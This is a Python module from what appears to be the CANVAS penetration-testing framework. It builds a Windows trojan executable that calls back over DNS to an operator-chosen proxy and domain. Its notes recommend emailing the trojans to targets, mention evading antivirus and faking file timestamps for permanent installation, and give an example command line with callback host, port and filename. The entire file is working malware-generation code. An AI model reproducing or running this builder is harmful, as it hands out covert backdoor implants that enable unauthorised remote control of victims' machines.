#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *

import time
from shellcode.standalone.windows import payloads
from MOSDEF import pelib

NAME                = "BuildDNSCallback"
DESCRIPTION         = "Creates an executable that will call back over DNS"

NOTES               = """

The filename can be anything you like, although under Windows we suggest
something ending in .exe. These files may be blocked by antivirus heuristics
(for example, as "Bloodhound" or another generic signature) and are quite
small files. You may want to use touchfromfile to set the timestamp on these
files if you're installing it permanently. It's your responsibility to
actually upload and execute these files.

Trojans created in this way take no arguments as these are hardcoded when you create them. Hence, they're
useful for emailing to targets, etc.

Commandline Example:
exploits/BuildDNSCallback/BuildDNSCallback.py -t 0.0.0.0 -O callback_host:192.168.1.1 -O callback_port:5555 -O OS:Windows -O filename:cow.dll
"""

DOCUMENTATION       =  {}
DOCUMENTATION["Notes"] = NOTES
VERSION             = "1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Trojans"

from libs.canvasos import *
from ExploitTypes.utility import Utility

class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.filename       = "trojan.exe"
        self.proxyaddr      = None
        self.domain         = None

    def getargs(self):
        self.getarg("proxyaddr") #dns ip
        self.getarg("domain")    #domain name
        self.getarg("filename")
    
    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        
        #check to make sure we have a proxyaddr argument
        if not self.proxyaddr:
            self.log("Cannot continue without a proxy address")
            self.setInfo("%s failed without PROXYADDR argument" % NAME)
            return 0

        #check to make sure we have a domain argument
        if not self.domain:
            self.log("Cannot continue without a domain name")
            self.setInfo("%s failed without DOMAIN argument" % NAME)
            return 0

        p = payloads.payloads()
        sc = p.dns_proxy("CNNN.NN.%s.%s" % ('dummy', self.domain), self.proxyaddr)
        #sc = p.httpcachedownload( self.url  )
        sc = p.assemble(sc)
        
        myPElib = pelib.PElib()
        exe = myPElib.createPEFileBuf(sc, gui=True)
        afile = file(self.filename, 'wb+')
        afile.write(exe)
        afile.close()
        self.log("File written to %s of %d bytes"%(self.filename, len(exe)))
        self.setInfo("%s Wrote %s callback to %s - done" % (NAME, self.proxyaddr, self.filename))
        return len(sc) != 0

if __name__=="__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
